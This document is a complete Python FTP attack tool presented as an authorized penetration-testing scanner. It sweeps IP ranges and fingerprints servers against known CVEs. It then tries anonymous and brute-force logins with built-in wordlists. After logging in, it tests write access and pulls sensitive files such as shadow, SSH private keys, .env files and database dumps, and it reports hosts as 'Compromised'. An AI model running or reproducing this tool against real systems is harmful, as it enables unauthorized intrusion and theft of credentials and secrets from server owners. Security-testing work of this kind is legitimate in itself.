#!/usr/bin/env python3

"""FTP Scanner v5 — Authorized Penetration Testing Tool.
Scans hosts for open FTP, attempts anonymous login, brute-forces credentials,
optionally enumerates files and tests write access after successful auth.
"""

import os
import sys
import csv
import html
import json
import ftplib
import socket
import signal
import argparse
import datetime
import threading
import ipaddress
import dataclasses
import concurrent.futures
from dataclasses import dataclass, field
from typing import Optional

import ipmagic
import prettyprint as pp

# ─── Constants ────────────────────────────────────────────────────────────────

VERSION = '5.0'
DEFAULT_PORT = 21
DEFAULT_TIMEOUT = 10.0
DEFAULT_THREADS = 10

DEFAULT_USERS = ['anonymous', 'ftp', 'admin', 'administrator', 'user', 'test', 'root', 'guest']
DEFAULT_PASSWORDS = [
    'anonymous@', 'anonymous', '', 'ftp', 'admin', 'admin123',
    'password', 'root', 'guest', 'test', '123456', 'default',
]

# FTP server software → known CVEs
FTP_CVE_MAP = {
    'vsftpd 2.3.4': [
        {'cve': 'CVE-2011-2523', 'severity': 'CRITICAL',
         'desc': 'vsftpd 2.3.4 backdoor — smiley-face username triggers bind shell on port 6200'},
    ],
    'proftpd 1.3.3': [
        {'cve': 'CVE-2010-4221', 'severity': 'CRITICAL',
         'desc': 'ProFTPD 1.3.3 mod_sql stack overflow via crafted SQL query'},
    ],
    'proftpd 1.3.5': [
        {'cve': 'CVE-2015-3306', 'severity': 'CRITICAL',
         'desc': 'ProFTPD 1.3.5 mod_copy allows unauthenticated file copy via SITE CPFR/CPTO'},
    ],
    'wu-ftpd': [
        {'cve': 'CVE-2001-0550', 'severity': 'HIGH',
         'desc': 'WU-FTPd glob expansion remote buffer overflow'},
    ],
    'filezilla server 0.': [
        {'cve': 'CVE-2006-6565', 'severity': 'MEDIUM',
         'desc': 'FileZilla Server 0.x directory traversal via .. in CWD command'},
    ],
}

# Files worth downloading during post-auth enumeration
INTERESTING_FILES = [
    '.bash_history', '.sh_history', '.zsh_history',
    'passwd', 'shadow', '.htpasswd', '.htaccess',
    '.env', '.env.local', '.env.production',
    'config.php', 'config.ini', 'config.yml', 'config.yaml', 'config.json',
    'wp-config.php', 'settings.py', 'database.yml',
    'id_rsa', 'id_ecdsa', 'id_ed25519',
    'backup.sql', 'dump.sql', 'db.sql',
]

_shutdown_event = threading.Event()

# ─── Data types ───────────────────────────────────────────────────────────────

@dataclass
class CVEEntry:
    cve: str
    severity: str
    description: str


@dataclass
class FTPResult:
    host: str
    port: int
    status: str          # 'success', 'anonymous', 'failed', 'unreachable', 'skipped'
    banner: Optional[str] = None
    software: Optional[str] = None
    cves: list = field(default_factory=list)
    credential_user: str = ''
    credential_pass: str = ''
    files: list = field(default_factory=list)
    writable: bool = False
    interesting_files: dict = field(default_factory=dict)   # filename → content preview
    attempts: int = 0
    duration: float = 0.0
    timestamp: str = ''
    error: Optional[str] = None
    asn_info: str = ''

# ─── Banner + CVE fingerprinting ─────────────────────────────────────────────

def grab_ftp_banner(host: str, port: int, timeout: float) -> Optional[str]:
    """Raw TCP banner grab — returns the 220 greeting line or None."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        banner = s.recv(1024).decode('utf-8', errors='replace').strip()
        s.close()
        return banner
    except Exception:
        return None


def fingerprint_ftp(banner: str) -> tuple:
    """Return (software_str, [CVEEntry, ...]) from a 220 banner."""
    if not banner:
        return ('', [])
    banner_lower = banner.lower()
    software = ''
    cves = []
    seen = set()

    for key, cve_list in FTP_CVE_MAP.items():
        if key.lower() in banner_lower:
            if not software:
                software = key
            for c in cve_list:
                if c['cve'] not in seen:
                    seen.add(c['cve'])
                    cves.append(CVEEntry(c['cve'], c['severity'], c['desc']))

    # Extract server string from banner even without a CVE match
    if not software:
        import re
        m = re.search(r'220[- ](.*?)(?:\r?\n|$)', banner)
        if m:
            software = m.group(1).strip()[:60]

    return (software, cves)

# ─── FTP auth workers ─────────────────────────────────────────────────────────

def _make_ftp(host: str, port: int, timeout: float, use_tls: bool) -> ftplib.FTP:
    """Create and connect an FTP (or FTP_TLS) client."""
    if use_tls:
        ftp = ftplib.FTP_TLS()
    else:
        ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=timeout)
    return ftp


def try_credential(host: str, port: int, user: str, password: str,
                   timeout: float, use_tls: bool) -> tuple:
    """Attempt a single FTP login. Returns (success, ftp_obj_or_None, error_or_None)."""
    ftp = None
    try:
        ftp = _make_ftp(host, port, timeout, use_tls)
        ftp.login(user=user, passwd=password)
        if use_tls:
            ftp.prot_p()  # switch to encrypted data channel
        return (True, ftp, None)
    except ftplib.error_perm as e:
        if ftp and ftp.sock:
            try:
                ftp.quit()
            except Exception:
                pass
        return (False, None, e)
    except Exception as e:
        if ftp and ftp.sock:
            try:
                ftp.quit()
            except Exception:
                pass
        return (False, None, e)

# ─── Post-auth enumeration ────────────────────────────────────────────────────

def enumerate_ftp(ftp: ftplib.FTP, host: str, depth: int, download_dir: Optional[str]) -> dict:
    """After successful login: list files, check write access, grab interesting files."""
    result = {
        'files': [],
        'writable': False,
        'interesting_files': {},
    }

    # Full recursive listing using MLSD if available, fallback to NLST
    def _list_dir(path: str, current_depth: int):
        if current_depth > depth:
            return
        try:
            entries = list(ftp.mlsd(path))
            for name, facts in entries:
                full = path.rstrip('/') + '/' + name
                result['files'].append(full)
                if facts.get('type') == 'dir' and name not in ('.', '..'):
                    _list_dir(full, current_depth + 1)
        except Exception:
            try:
                names = ftp.nlst(path)
                for name in names:
                    result['files'].append(name)
            except Exception:
                pass

    _list_dir('/', 0)

    # Check write access: try to create and immediately delete a temp file
    try:
        import io
        test_name = '/.writable_test_%d' % id(ftp)
        ftp.storbinary('STOR ' + test_name, io.BytesIO(b'test'))
        ftp.delete(test_name)
        result['writable'] = True
        pp.warning('[FTP] %s has WRITE access — writable FTP!' % host)
    except Exception:
        pass

    # Grab interesting files (preview first 512 bytes)
    for fname in INTERESTING_FILES:
        for listed in result['files']:
            if listed.lower().endswith('/' + fname.lower()) or listed.lower() == fname.lower():
                try:
                    import io
                    buf = io.BytesIO()
                    ftp.retrbinary('RETR ' + listed, buf.write, blocksize=512)
                    content = buf.getvalue()[:512].decode('utf-8', errors='replace')
                    result['interesting_files'][listed] = content
                    pp.warning('[FTP] Grabbed: %s (%d bytes)' % (listed, len(buf.getvalue())))
                    if download_dir:
                        os.makedirs(download_dir, exist_ok=True)
                        out_name = os.path.join(download_dir, listed.lstrip('/').replace('/', '_'))
                        with open(out_name, 'wb') as f:
                            f.write(buf.getvalue())
                except Exception:
                    pass
                break

    return result

# ─── Host scanner ─────────────────────────────────────────────────────────────

def scan_host(host: str, port: int, userlist: list, passwordlist: list,
              config, stats: dict) -> FTPResult:
    """Full scan lifecycle for one FTP host."""
    t_start = __import__('time').monotonic()
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
    result = FTPResult(host=host, port=port, status='failed', timestamp=ts)

    if _shutdown_event.is_set():
        result.status = 'skipped'
        return result

    # 1. Banner grab
    banner = grab_ftp_banner(host, port, config.timeout)
    if banner is None:
        result.status = 'unreachable'
        result.error = 'No response on %s:%d' % (host, port)
        result.duration = __import__('time').monotonic() - t_start
        if config.verbose:
            pp.warning('[unreachable] %s:%d' % (host, port))
        return result

    if not any(code in banner[:4] for code in ('220', '230')):
        result.status = 'unreachable'
        result.error = 'Port %d on %s is not FTP (banner: %s)' % (port, host, banner[:60])
        result.duration = __import__('time').monotonic() - t_start
        return result

    result.banner = banner
    software, cves = fingerprint_ftp(banner)
    result.software = software
    result.cves = cves

    pp.info('[banner] %s:%d — %s' % (host, port, banner[:80]))

    if cves:
        for c in cves:
            pp.warning('[CVE] %s:%d — %s [%s]: %s' % (host, port, c.cve, c.severity, c.description))

    # 2. ASN info (lazy — only if requested)
    if config.show_asn:
        info_str = ipmagic.get_asn_info(host)
        result.asn_info = info_str
        if info_str:
            pp.info_spaces('ASN: %s' % info_str)

    # 3. Anonymous first — always try before wordlist
    anon_creds = [
        ('anonymous', 'anonymous@'),
        ('anonymous', 'anonymous'),
        ('anonymous', ''),
        ('ftp', 'ftp'),
        ('ftp', ''),
    ]

    for user, password in anon_creds:
        if _shutdown_event.is_set():
            break
        result.attempts += 1
        ok, ftp_obj, exc = try_credential(host, port, user, password, config.timeout, config.use_tls)
        if ok:
            pp.status('[ANONYMOUS] %s:%d — %s:%s' % (host, port, user, password))
            result.status = 'anonymous'
            result.credential_user = user
            result.credential_pass = password

            if config.enumerate and ftp_obj:
                enum = enumerate_ftp(ftp_obj, host, config.depth, config.download_dir)
                result.files = enum['files']
                result.writable = enum['writable']
                result.interesting_files = enum['interesting_files']

            if ftp_obj and ftp_obj.sock:
                try:
                    ftp_obj.quit()
                except Exception:
                    pass

            result.duration = __import__('time').monotonic() - t_start
            with threading.Lock():
                stats['success'] = stats.get('success', 0) + 1
            return result

        # Network error (not auth failure) — skip host
        if exc and not isinstance(exc, ftplib.error_perm):
            exc_str = str(exc).lower()
            if any(k in exc_str for k in ('refused', 'timeout', 'timed out', 'no route')):
                result.status = 'unreachable'
                result.error = str(exc)[:120]
                result.duration = __import__('time').monotonic() - t_start
                return result

    # 4. Credential brute-force
    for user in userlist:
        for password in passwordlist:
            if _shutdown_event.is_set():
                break
            result.attempts += 1
            ok, ftp_obj, exc = try_credential(host, port, user, password, config.timeout, config.use_tls)
            if ok:
                pp.status('[SUCCESS] %s:%d — %s:%s' % (host, port, user, password))
                result.status = 'success'
                result.credential_user = user
                result.credential_pass = password

                if config.enumerate and ftp_obj:
                    enum = enumerate_ftp(ftp_obj, host, config.depth, config.download_dir)
                    result.files = enum['files']
                    result.writable = enum['writable']
                    result.interesting_files = enum['interesting_files']

                if ftp_obj and ftp_obj.sock:
                    try:
                        ftp_obj.quit()
                    except Exception:
                        pass

                result.duration = __import__('time').monotonic() - t_start
                with threading.Lock():
                    stats['success'] = stats.get('success', 0) + 1
                return result

            if config.verbose:
                pp.warning('[failed] %s:%d %s:%s' % (host, port, user, password))

    if result.status == 'failed':
        pp.info('[done] %s:%d — no credentials found (%d attempts)' % (
            host, port, result.attempts))

    result.duration = __import__('time').monotonic() - t_start
    return result

# ─── Output writers ───────────────────────────────────────────────────────────

def write_json(results: list, path: str):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            for r in results:
                if r.status in ('success', 'anonymous') or r.cves:
                    f.write(json.dumps(dataclasses.asdict(r)) + '\n')
        pp.info('JSON written to %s' % path)
    except OSError as e:
        pp.error('Cannot write JSON: %s' % e)


def write_csv(results: list, path: str):
    fields = ['HOST', 'PORT', 'STATUS', 'USER', 'PASSWORD', 'BANNER',
              'SOFTWARE', 'CVE_COUNT', 'WRITABLE', 'FILES_FOUND',
              'INTERESTING_FILES', 'ATTEMPTS', 'DURATION_S', 'TIMESTAMP']
    try:
        with open(path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fields, quoting=csv.QUOTE_ALL)
            writer.writeheader()
            for r in results:
                writer.writerow({
                    'HOST': r.host, 'PORT': r.port, 'STATUS': r.status,
                    'USER': r.credential_user, 'PASSWORD': r.credential_pass,
                    'BANNER': (r.banner or '')[:100],
                    'SOFTWARE': r.software or '',
                    'CVE_COUNT': len(r.cves),
                    'WRITABLE': 'Yes' if r.writable else 'No',
                    'FILES_FOUND': len(r.files),
                    'INTERESTING_FILES': ', '.join(r.interesting_files.keys()),
                    'ATTEMPTS': r.attempts,
                    'DURATION_S': '%.1f' % r.duration,
                    'TIMESTAMP': r.timestamp,
                })
        pp.info('CSV written to %s' % path)
    except OSError as e:
        pp.error('Cannot write CSV: %s' % e)


def write_html(results: list, start_dt: datetime.datetime,
               end_dt: datetime.datetime, path: str):
    duration = str(end_dt - start_dt).split('.')[0]
    successes = [r for r in results if r.status in ('success', 'anonymous')]
    cve_hits = [r for r in results if r.cves]

    sev_color = {'CRITICAL': '#dc3545', 'HIGH': '#fd7e14',
                 'MEDIUM': '#ffc107', 'LOW': '#17a2b8'}

    rows = ''
    for r in successes:
        cve_str = ', '.join(
            "<a href='https://nvd.nist.gov/vuln/detail/%s' target='_blank'>%s</a>" % (c.cve, c.cve)
            for c in r.cves
        )
        rows += ("<tr><td>%s:%d</td><td>%s</td><td>%s</td><td>%s</td>"
                 "<td>%s</td><td>%s</td><td>%s</td></tr>\n") % (
            html.escape(r.host), r.port,
            html.escape(r.status),
            html.escape(r.credential_user),
            html.escape(r.credential_pass),
            html.escape(r.software or ''),
            cve_str,
            'YES' if r.writable else 'no',
        )

    cve_rows = ''
    for r in cve_hits:
        for c in r.cves:
            color = sev_color.get(c.severity, '#6c757d')
            cve_rows += ("<tr><td>%s:%d</td><td>%s</td>"
                         "<td><a href='https://nvd.nist.gov/vuln/detail/%s' target='_blank'>%s</a></td>"
                         "<td style='color:%s;font-weight:bold'>%s</td><td>%s</td></tr>\n") % (
                html.escape(r.host), r.port,
                html.escape(r.banner or ''),
                c.cve, c.cve, color, c.severity,
                html.escape(c.description),
            )

    content = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>FTP Scan Report</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;margin:20px;background:#1a1a2e;color:#e0e0e0;}
h1,h2{color:#00d4ff;} .meta{color:#aaa;margin-bottom:20px;}
.cards{display:flex;flex-wrap:wrap;gap:15px;margin:15px 0;}
.card{background:#16213e;padding:15px 25px;border-radius:8px;text-align:center;}
.card .count{font-size:2em;font-weight:bold;}
table{border-collapse:collapse;width:100%%;margin-bottom:30px;}
th,td{border:1px solid #333;padding:8px;text-align:left;vertical-align:top;}
th{background:#16213e;color:#00d4ff;}
tr:nth-child(even){background:#0f3460;} tr:hover{background:#1a1a4e;}
a{color:#00d4ff;}
</style></head><body>
<h1>FTP Security Assessment Report</h1>
<div class="meta">Date: <strong>%s</strong> | Duration: <strong>%s</strong></div>
<div class="cards">
  <div class="card"><div class="count" style="color:#00d4ff">%d</div><div>Targets</div></div>
  <div class="card"><div class="count" style="color:#28a745">%d</div><div>Compromised</div></div>
  <div class="card"><div class="count" style="color:#fd7e14">%d</div><div>CVE Hosts</div></div>
</div>
<h2>Compromised Hosts (%d)</h2>
<table><tr><th>Host:Port</th><th>Type</th><th>User</th><th>Password</th>
<th>Software</th><th>CVEs</th><th>Writable</th></tr>
%s</table>
<h2>CVE Findings</h2>
<table><tr><th>Host:Port</th><th>Banner</th><th>CVE</th><th>Severity</th><th>Description</th></tr>
%s</table>
</body></html>""" % (
        html.escape(start_dt.strftime('%Y-%m-%d %H:%M:%S')),
        html.escape(duration),
        len(results), len(successes), len(cve_hits),
        len(successes),
        rows or "<tr><td colspan='7' style='color:#6c757d'>No credentials found.</td></tr>",
        cve_rows or "<tr><td colspan='5' style='color:#6c757d'>No CVEs identified.</td></tr>",
    )

    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        pp.info('HTML report written to %s' % path)
    except OSError as e:
        pp.error('Cannot write HTML: %s' % e)

# ─── Target loading ───────────────────────────────────────────────────────────

def load_targets(source: str, default_port: int) -> list:
    import re as _re
    targets = []
    seen = set()

    def _add(host, port):
        key = (host, port)
        if key not in seen:
            seen.add(key)
            targets.append(key)

    def _parse(line):
        line = line.strip()
        if not line or line.startswith('#'):
            return
        line = _re.sub(r'^https?://', '', line).split('/')[0].split('?')[0]
        if ':' in line and line.count(':') == 1:
            h, p = line.rsplit(':', 1)
            try:
                _add(h, int(p))
                return
            except ValueError:
                pass
        _add(line, default_port)

    if source != '-' and not os.path.exists(source):
        try:
            net = ipaddress.ip_network(source, strict=False)
            for ip in net.hosts():
                _add(str(ip), default_port)
            return targets
        except ValueError:
            pass
        _parse(source)
        return targets

    lines = sys.stdin.readlines() if source == '-' else open(source, encoding='utf-8').readlines()
    for line in lines:
        _parse(line)
    return targets

# ─── Signal handler ───────────────────────────────────────────────────────────

def _signal_handler(sig, frame):
    pp.error('Interrupt received — finishing current attempts...')
    _shutdown_event.set()

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ─── CLI ──────────────────────────────────────────────────────────────────────

def build_parser():
    parser = argparse.ArgumentParser(
        prog='ftp_scanner.py',
        description='FTP Scanner v%s — Authorized Penetration Testing Tool' % VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  ./ftp_scanner.py -r 10.0.0.0/24
  ./ftp_scanner.py -r targets.txt -U users.txt -P passwords.txt --enumerate
  ./ftp_scanner.py -r 10.0.0.1 -p 2121 --tls --html-report report.html
  ./ftp_scanner.py -r results_*/live_hosts.txt --json-output ftp_findings.json
"""
    )
    parser.add_argument('-r', '--target', dest='target', metavar='TARGET', required=True,
        help='CIDR, host, host:port, file, or "-" for stdin')
    parser.add_argument('-p', '--port', dest='port', type=int, default=DEFAULT_PORT,
        help='Default FTP port (default: 21)')
    parser.add_argument('-U', '--userlist', dest='userlist', metavar='FILE',
        help='File of usernames')
    parser.add_argument('-P', '--passlist', dest='passlist', metavar='FILE',
        help='File of passwords')
    parser.add_argument('-m', '--maxthread', dest='threads', type=int, default=DEFAULT_THREADS,
        help='Max concurrent threads (default: 10)')
    parser.add_argument('-t', '--timeout', dest='timeout', type=float, default=DEFAULT_TIMEOUT,
        help='Per-connection timeout in seconds (default: 10)')
    parser.add_argument('--tls', dest='use_tls', default=False, action='store_true',
        help='Use FTPS/TLS (FTP_TLS)')
    parser.add_argument('--enumerate', dest='enumerate', default=False, action='store_true',
        help='List files and check write access after successful login')
    parser.add_argument('--depth', dest='depth', type=int, default=3,
        help='Recursive directory depth for --enumerate (default: 3)')
    parser.add_argument('--download-dir', dest='download_dir', metavar='DIR',
        help='Download interesting files to this directory')
    parser.add_argument('--asn', dest='show_asn', default=False, action='store_true',
        help='Show ASN info for each host')
    parser.add_argument('-o', '--output', dest='text_output', metavar='FILE',
        help='Append text log to file')
    parser.add_argument('--json-output', dest='json_output', default='ftp_findings.json',
        metavar='FILE', help='JSONL findings output (default: ftp_findings.json)')
    parser.add_argument('--no-json', dest='json_output', action='store_const', const=None,
        help='Disable JSON output')
    parser.add_argument('--csv-output', dest='csv_output', metavar='FILE',
        help='CSV output file')
    parser.add_argument('--html-report', dest='html_report', metavar='FILE',
        help='HTML report output file')
    parser.add_argument('-v', '--verbose', dest='verbose', default=False, action='store_true',
        help='Verbose output')
    return parser

# ─── Legacy shim for port_scanner.py compatibility ───────────────────────────

def FTPBruteForce(host: str, userlist: list, passwordlist: list):
    """Legacy 4-tuple interface for port_scanner.py."""
    class _Cfg:
        port = DEFAULT_PORT
        timeout = DEFAULT_TIMEOUT
        use_tls = False
        enumerate = False
        depth = 1
        download_dir = None
        show_asn = False
        verbose = False

    stats = {}
    result = scan_host(
        host, DEFAULT_PORT,
        userlist or DEFAULT_USERS,
        passwordlist or DEFAULT_PASSWORDS,
        _Cfg(), stats,
    )

    err, out, verb, warn = [], [], [], []
    verb.append('Performing FTP scan on %s' % host)

    if result.status == 'unreachable':
        err.append('FTP not available on %s: %s' % (host, result.error or ''))
    elif result.status in ('success', 'anonymous'):
        out.append('FTP login successful on %s (%s:%s) [%s]' % (
            host, result.credential_user, result.credential_pass,
            result.banner or ''))
    else:
        warn.append('No valid credentials on %s (%d attempts)' % (host, result.attempts))

    return (err, out, verb, warn)

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    banner_art = """
  ███████╗████████╗██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██╔════╝╚══██╔══╝██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
  █████╗     ██║   ██████╔╝    ███████╗██║     ███████║██╔██╗ ██║
  ██╔══╝     ██║   ██╔═══╝     ╚════██║██║     ██╔══██║██║╚██╗██║
  ██║        ██║   ██║         ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═╝        ╚═╝   ╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
             FTP Security Assessment Tool v%s
""" % VERSION
    print(banner_art)

    parser = build_parser()
    options = parser.parse_args()

    ctime = datetime.datetime.now()

    userlist = DEFAULT_USERS[:]
    passwordlist = DEFAULT_PASSWORDS[:]

    if options.userlist:
        try:
            with open(options.userlist, encoding='utf-8') as f:
                userlist = [l.rstrip('\n') for l in f if l.strip()]
        except OSError as e:
            pp.error('Cannot open userlist: %s' % e); sys.exit(1)

    if options.passlist:
        try:
            with open(options.passlist, encoding='utf-8') as f:
                passwordlist = [l.rstrip('\n') for l in f if l.strip()]
        except OSError as e:
            pp.error('Cannot open passlist: %s' % e); sys.exit(1)

    targets = load_targets(options.target, options.port)
    if not targets:
        pp.error('No valid targets found'); sys.exit(1)

    pp.status('Targets:   %d hosts' % len(targets))
    pp.status('Threads:   %d  |  Timeout: %.0fs%s' % (
        options.threads, options.timeout, '  |  TLS: ON' if options.use_tls else ''))

    stats: dict = {'success': 0}
    all_results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=options.threads) as executor:
        futures = {
            executor.submit(scan_host, host, port, userlist, passwordlist, options, stats): (host, port)
            for host, port in targets
        }
        for f in concurrent.futures.as_completed(futures):
            if _shutdown_event.is_set():
                break
            all_results.append(f.result())

    etime = datetime.datetime.now()
    total = str(etime - ctime).split('.')[0]

    successes = [r for r in all_results if r.status in ('success', 'anonymous')]
    cve_hosts = [r for r in all_results if r.cves]

    pp.status('Scan completed in: %s' % total)
    pp.status('Results: %d hosts | %d compromised | %d CVE hosts' % (
        len(all_results), len(successes), len(cve_hosts)))

    if successes:
        pp.status('─── Compromised Hosts ───────────────────────────────')
        for r in successes:
            pp.status('  [+] %s:%d  %s:%s  [%s]%s' % (
                r.host, r.port, r.credential_user, r.credential_pass,
                r.status,
                '  WRITABLE' if r.writable else ''))

    if options.json_output:
        write_json(all_results, options.json_output)
    if options.csv_output:
        write_csv(all_results, options.csv_output)
    if options.html_report:
        write_html(all_results, ctime, etime, options.html_report)
    if options.text_output:
        pp.log_status('FTP scan completed in %s — %d compromised' % (total, len(successes)),
                      options.text_output)


if __name__ == '__main__':
    main()
